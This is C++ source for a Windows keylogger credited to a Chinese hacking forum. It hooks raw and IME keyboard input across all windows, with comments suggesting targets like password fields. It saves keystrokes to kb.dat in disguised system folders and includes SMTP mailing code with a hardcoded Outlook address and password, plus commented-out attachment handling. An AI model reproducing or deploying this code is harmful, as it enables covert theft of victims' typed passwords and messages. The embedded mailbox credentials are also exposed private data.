/*======================================
// 键盘钩子 
// 火狐技术联盟[F.S.T]
// http://www.wrsky.com
// 2005/9/25
=======================================*/
//#include "stdafx.h"
#include "keyboardhook.h"
#include "tool.h"
#include "SendMail.h"

#define WM_MESSAGE_HOOK		WM_USER+200 //
#define WM_KEYBOARD_HOOK	WM_USER+201 //

BOOL
	IsWinVistaOrLater (VOID)
{

	OSVERSIONINFO osvi;

	CHAR buffer[256] = {0};

	ZeroMemory(&osvi, sizeof(OSVERSIONINFO));
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);

	GetVersionEx(&osvi);

	sprintf(buffer, "dwMajorVersion %d\n", osvi.dwMajorVersion);
	OutputDebugStringA(buffer);

	if (osvi.dwMajorVersion > 5)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}

int APIENTRY WinMain1(HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine,
	int       nCmdShow)
{ 

	KeyBoardHook kbh;
	char dll_path[MAX_PATH];
	::GetModuleFileName(NULL,dll_path,sizeof(dll_path));
	char *pos=strrchr(dll_path,'\\');
	if(pos==NULL) return 0;
	strcpy(pos,"\\\0\0");
	strcat(dll_path,"hookdll.dll");
	strcpy(kbh.KBINFO.Dll_path,dll_path);
	OutputDebugStringA(kbh.KBINFO.Dll_path);
	strcpy(kbh.KBINFO.Key,"*");//*号记录所有的窗口键盘信息，否则请以逗号间隔填入关键字:"密码,远程"
	kbh.KBINFO.MaxDataLen=1;
	kbh.SetKBHookType(3);      //1:原始键盘钩子，2:支持输入法的消息钩子,可以截获中文，3:原始钩子加输入法处理后的钩子
	if (IsWinVistaOrLater())
	{
		strcpy(kbh.KBINFO.Savepath,"C:\\Users\\Public\\Documents\\kb.dat");
	}
	else
	{
		strcpy(kbh.KBINFO.Savepath,"C:\\Program Files\\Common Files\\Microsoft Shared\\kb.dat");
	}
	//strcpy(kbh.KBINFO.Savepath,"C:\\Program Files\\Common Files\\Microsoft Shared\\kb.dat");
	OutputDebugStringA(kbh.KBINFO.Savepath);

	kbh.Start();
	while(true) Sleep(1000);
	return 0;
}

HookManager hm;
SharedMemory sm("hook_area");

void log_message(MSG& msg)
{
	char str[128] = {0};
	sm.read_mem(str, sizeof(int), sizeof(str));
	str[sizeof(str) - 1] = 0;
	str[sizeof(str) - 2] = 0;
	Logger::debug("<%s>", str);
	Logger::write("<%s>", str);
}

void log_keyboard(MSG& msg)
{
	char str[20] = {0};
	sm.read_mem(str, sizeof(int), sizeof(str));
	str[sizeof(str) - 1] = 0;
	if(str[1] != 0){
		Logger::debug("[%s]", str);
		Logger::write("[%s]", str);
	} else{
		Logger::debug("%s", str);
		Logger::write("%s", str);
	}
}

int APIENTRY WinMain2(HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine,
	int       nCmdShow)
{ 
	if(!sm.create(sizeof(int) + 128)){
		perror("Create SM Fail");
		exit(1);
	}
	sm.write_int(GetCurrentThreadId());
	if(!hm.init()){
		perror("Init Fail");
		exit(1);
	}
	hm.start_keyboard_hook();
	hm.start_message_hook();

	MSG msg;
	time_t last_time = time(NULL);
	while(true) {
		bool ret = PeekMessage(&msg, NULL, WM_MESSAGE_HOOK, WM_KEYBOARD_HOOK, PM_REMOVE);
		if(ret){
			switch(msg.message){
			case WM_MESSAGE_HOOK:
				log_message(msg);
				break;
			case WM_KEYBOARD_HOOK:
				log_keyboard(msg);
				break;
			default:
				break;
			}
		}
		time_t cur_time = time(NULL);
		if(difftime(cur_time, last_time) > 30){
			hm.start_message_hook();
			last_time = cur_time;
		}
		Sleep(1);
	}
	return 0;
}

int APIENTRY WinMain(HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine,
	int       nCmdShow)
{
	//return WinMain2(hInstance, hPrevInstance, lpCmdLine, nCmdShow);
	CSmtp smtp(  
		25,                             /*smtp端口*/  
		"smtp.outlook.com",                 /*smtp服务器地址*/  
		"cchtriptest@outlook.com",    /*你的邮箱地址*/  
		"cchtrip123",                  /*邮箱密码*/  
		"cchtriptest@outlook.com",    /*目的邮箱地址*/  
		"好啊!",                          /*主题*/  
		"李懿虎同学，你好！收到请回复！"       /*邮件正文*/  
		);  
	/** 
	//添加附件时注意,\一定要写成\\，因为转义字符的缘故 
	string filePath("D:\\课程设计报告.doc"); 
	smtp.AddAttachment(filePath); 
	*/  

	/*还可以调用CSmtp::DeleteAttachment函数删除附件，还有一些函数，自己看头文件吧!*/  
	//filePath = "C:\\Users\\李懿虎\\Desktop\\sendEmail.cpp";  
	//smtp.AddAttachment(filePath);  

	int err;  
	if ((err = smtp.SendEmail_Ex()) != 0)  
	{  
		if (err == 1)  
			cout << "错误1: 由于网络不畅通，发送失败!" << endl;  
		if (err == 2)  
			cout << "错误2: 用户名错误,请核对!" << endl;  
		if (err == 3)  
			cout << "错误3: 用户密码错误，请核对!" << endl;  
		if (err == 4)  
			cout << "错误4: 请检查附件目录是否正确，以及文件是否存在!" << endl;  
	}  
	system("pause");  
	return 0;  
}


